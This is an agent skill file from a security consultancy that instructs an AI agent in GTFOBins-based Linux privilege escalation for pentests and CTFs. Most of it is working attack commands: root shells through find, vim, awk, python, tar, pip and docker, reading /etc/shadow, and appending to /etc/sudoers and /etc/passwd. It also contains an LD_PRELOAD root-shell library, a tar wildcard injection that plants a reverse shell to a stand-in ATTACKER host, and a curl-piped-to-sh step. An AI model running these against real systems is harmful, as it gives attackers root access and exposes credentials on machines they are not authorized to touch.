---
name: gtfobins
description: >
  Operate and apply GTFOBins — the curated list of Unix binaries exploitable for
  privilege escalation, file operations, shell spawning, and capability abuse. Use
  when performing Linux/Unix privilege escalation, post-exploitation enumeration,
  SUID/sudo/capabilities exploitation, or when the user needs to leverage a
  specific binary to escape restricted shells, read protected files, or gain a
  root shell. Covers all GTFOBins categories, key binary techniques, SUID
  enumeration, sudo -l parsing, capabilities exploitation, and integration with
  LinPEAS/LinEnum output.
metadata:
  author: redhoundinfosec
  version: '1.0'
  reference: https://gtfobins.github.io
---

# gtfobins Agent Skill

## When to Use This Skill

Use this skill when:
- The user needs to escalate privileges on a Linux/Unix system
- Working on CTF or pentest engagements and need binary-based privesc
- The user has `sudo -l` output and needs to identify exploitation paths
- The user found SUID binaries and needs GTFOBins techniques for them
- The user needs to read/write files as another user without a full shell
- Escaping restricted shells (rbash, lshell, jailed environments)
- The user asks about capabilities-based privilege escalation

## What GTFOBins Does

GTFOBins (Get The F*** Out Binaries) is a curated list of Unix binaries that
can be abused to bypass local security restrictions including file permissions,
sudo misconfiguration, capability grants, and SUID bits. Each entry documents
how a binary can be used for shell spawning, file read/write, file upload/download,
reverse shells, and more — all using only the binary itself and standard features.

## GTFOBins Categories

| Category         | What It Enables |
|-----------------|-----------------|
| Shell           | Spawn an interactive shell |
| Command         | Execute arbitrary OS commands |
| Reverse Shell   | Connect back to attacker host |
| File Upload     | Exfiltrate files to remote |
| File Download   | Pull attacker-controlled files |
| File Read       | Read files (e.g., /etc/shadow) without shell |
| File Write      | Write to protected paths |
| SUID            | Abuse binary with SUID bit set |
| Sudo            | Abuse `sudo` permission for binary |
| Capabilities    | Abuse Linux capabilities grant |
| Limited SUID    | Binary is SUID but restricted; partial exploitation |

## SUID Enumeration Workflow

```bash
# Find all SUID binaries system-wide
find / -perm -4000 -type f 2>/dev/null

# SUID + SGID combined
find / -perm /6000 -type f 2>/dev/null

# Only user-owned SUID (unusual — high value)
find / -perm -4000 -user root -type f 2>/dev/null

# Quick cross-reference against GTFOBins categories
find / -perm -4000 -type f 2>/dev/null | xargs -I{} basename {} | sort -u
```

Cross-reference each binary name at `https://gtfobins.github.io/#+suid` or use:
```bash
# Offline search if you have the GTFOBins repo cloned
grep -rl "suid" ~/gtfobins/_gtfobins/ | xargs -I{} basename {} .md
```

## sudo -l Parsing Workflow

```bash
sudo -l
# Look for entries like:
# (ALL) NOPASSWD: /usr/bin/vim
# (root) /usr/bin/python3 /opt/script.py
# (ALL) /usr/bin/find
```

Key patterns to exploit:
1. `NOPASSWD` — no password required, highest value
2. Binaries that spawn subprocesses (vim, less, man, git, awk)
3. Wildcards: `(ALL) /usr/bin/python3 *` — argument injection possible
4. Relative paths without full path — PATH hijacking possible

## Capabilities Exploitation

```bash
# Enumerate capabilities on all binaries
getcap -r / 2>/dev/null

# Common dangerous capabilities
# cap_setuid+ep   — set UID to root
# cap_net_raw+ep  — raw socket access
# cap_dac_read_search+ep — bypass DAC read restrictions
# cap_fowner+ep   — bypass file ownership checks
```

Example: `python3` with `cap_setuid+ep`:
```bash
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Example: `perl` with `cap_setuid+ep`:
```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

Example: `ruby` with `cap_setuid+ep`:
```bash
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```

## Key Binary Techniques

### find
```bash
# SUID shell
find . -exec /bin/bash -p \; -quit

# Sudo shell
sudo find . -exec /bin/bash \; -quit

# Command execution
find . -exec whoami \;
```

### vim / vi
```bash
# SUID/Sudo shell
vim -c ':!/bin/bash'
# OR from within vim
:set shell=/bin/bash
:shell

# File read
vim /etc/shadow  # if readable via SUID

# Sudo vim file write
sudo vim /etc/sudoers
# In vim: :w !tee -a /etc/sudoers  (append line)
```

### less / more
```bash
# Shell escape from within pager
!bash
# OR
!/bin/sh

# Sudo
sudo less /etc/passwd
# then: !bash
```

### awk
```bash
# Sudo/SUID shell
awk 'BEGIN {system("/bin/bash")}'
sudo awk 'BEGIN {system("/bin/bash")}'

# File read
awk '{print}' /etc/shadow
```

### python / python3
```bash
# Shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# SUID (setuid first)
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Sudo
sudo python3 -c 'import os; os.system("/bin/bash")'

# File read
python3 -c 'print(open("/etc/shadow").read())'
```

### perl
```bash
# Sudo/SUID shell
sudo perl -e 'exec "/bin/bash"'

# With setuid capability
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash"'

# Reverse shell
perl -e 'use Socket; ... '  # full one-liner from GTFOBins
```

### nmap
```bash
# Interactive mode (older nmap < 5.20)
nmap --interactive
nmap> !bash

# Script execution (any version)
echo 'os.execute("/bin/bash")' > /tmp/shell.nse
nmap --script=/tmp/shell.nse localhost
sudo nmap --script=/tmp/shell.nse localhost
```

### env
```bash
# SUID/Sudo shell
env /bin/bash -p     # -p preserves effective UID

sudo env /bin/bash
```

### tar
```bash
# Sudo/SUID shell via checkpoint
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# File write (as root via sudo)
sudo tar -cf /dev/null /dev/null --checkpoint=1 \
  --checkpoint-action=exec='bash -c "echo user ALL=\(ALL\) NOPASSWD:ALL >> /etc/sudoers"'
```

### zip
```bash
# Sudo shell via unzip trick
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'bash #'
```

### git
```bash
# Sudo shell via pager
sudo git -p help config
# then: !/bin/bash

# Or via hooks
sudo git commit --allow-empty -m x \
  --exec 'bash -c "bash <&2 >&2 2>&/dev/tty"'
```

### docker
```bash
# If user is in docker group — equivalent to root
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Read shadow
docker run --rm -v /etc/shadow:/shadow alpine cat /shadow
```

### pip
```bash
# Sudo pip install to execute setup.py as root
TF=$(mktemp -d)
echo "import os; os.system('/bin/bash')" > $TF/setup.py
sudo pip install $TF
```

### cp / mv
```bash
# File write via sudo — overwrite /etc/passwd
echo 'root2::0:0:root:/root:/bin/bash' >> /tmp/passwd
sudo cp /tmp/passwd /etc/passwd
# Then: su root2
```

### tee
```bash
# Write to protected file
echo 'user ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers
```

### bash (with SUID)
```bash
bash -p    # -p: don't drop privileges, keeps EUID=0
```

## Integration with LinPEAS Output

LinPEAS highlights interesting SUID/sudo/capability findings. Map them:

1. LinPEAS section `SUID` → grep binary names → check GTFOBins `#+suid`
2. LinPEAS section `sudo -l` output → check GTFOBins `#+sudo`
3. LinPEAS section `Capabilities` → check GTFOBins `#+capabilities`

```bash
# Run LinPEAS and save output
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh > linpeas.txt

# Extract SUID binaries from LinPEAS output
grep -A2 "SUID\|suid" linpeas.txt | grep "\/usr\|\/bin\|\/sbin" | awk '{print $1}' | sort -u

# Cross-reference with GTFOBins (requires local clone)
git clone https://github.com/GTFOBins/GTFOBins.github.io ~/gtfobins
for bin in $(cat suid_list.txt); do
  [ -f ~/gtfobins/_gtfobins/${bin}.md ] && echo "[+] GTFOBins entry: $bin"
done
```

## Restricted Shell Escapes

Common techniques using GTFOBins entries:
```bash
# rbash / restricted bash
bash --noprofile      # if bash itself is executable
vi -c ':set shell=/bin/bash' -c ':shell'
awk 'BEGIN {system("/bin/bash")}'
python3 -c 'import os; os.system("/bin/bash")'

# lshell
echo os.system('/bin/bash')
help; !/bin/bash      # some versions

# Check PATH restrictions in rbash
echo $PATH
export PATH=$PATH:/usr/local/sbin:/usr/sbin:/sbin
```

## File Read Without Shell

```bash
# Read /etc/shadow (if binary is SUID or sudoable)
# Using awk
sudo awk '{print}' /etc/shadow

# Using tee
sudo tee /dev/stdin < /etc/shadow

# Using cp (copy to readable location)
sudo cp /etc/shadow /tmp/shadow && cat /tmp/shadow

# Using base64
sudo base64 /etc/shadow | base64 -d

# Using cat (obvious but often overlooked via sudo)
sudo cat /etc/shadow
```

## Advanced Techniques

### Wildcard Injection (tar)
```bash
# If cron runs: tar czf /backup/*.tar.gz /var/www/
# Create malicious files in /var/www/
echo '' > '--checkpoint=1'
echo '' > '--checkpoint-action=exec=bash shell.sh'
echo '/bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1' > shell.sh
# When cron runs tar, it processes filenames as flags
```

### PATH Hijacking (sudo without full path)
```bash
# sudoers: (ALL) NOPASSWD: /usr/bin/script_that_calls_curl
# If script calls 'curl' without full path:
echo '/bin/bash' > /tmp/curl
chmod +x /tmp/curl
export PATH=/tmp:$PATH
sudo /usr/bin/script_that_calls_curl
```

### LD_PRELOAD Abuse
```bash
# sudoers must allow env_keep+=LD_PRELOAD
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() { setuid(0); system("/bin/bash -p"); }
EOF
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so [any allowed binary]
```

## Troubleshooting

**Binary not in GTFOBins**: Check `--version` and search for similar binaries.
Old versions may have `--interactive` modes removed in newer releases (nmap).

**SUID bit dropped**: Some systems mount `/tmp` with `nosuid`. If your compiled
binary drops SUID, move to `/var/tmp` or `/dev/shm`.

**sudo requires TTY**: Add `-t` to SSH for TTY: `ssh -t user@host sudo /bin/bash`

**AppArmor blocking**: Check `aa-status`. Profiles may restrict SUID binaries
even if the GTFOBins technique is valid. Try: `cat /sys/kernel/security/apparmor/profiles`

**SELinux denials**: Check `ausearch -m avc -ts recent` to identify blocks.
`getenforce` to verify enforcement mode.
---

> Built by [Red Hound InfoSec](https://redhound.us) — On-demand offensive security expertise for SMBs.
> 20+ years of Fortune 500 experience. Penetration testing, attack surface analysis, and security consulting.
>
> **Related reading**: [How to Attack-Test Your Own Domain Controllers Before an Adversary Does](https://redhound.us/attack-test-domain-controllers)
>
> [redhound.us](https://redhound.us) | [GitHub](https://github.com/redhoundinfosec) | [Book a consultation](https://redhound.us/#contact)
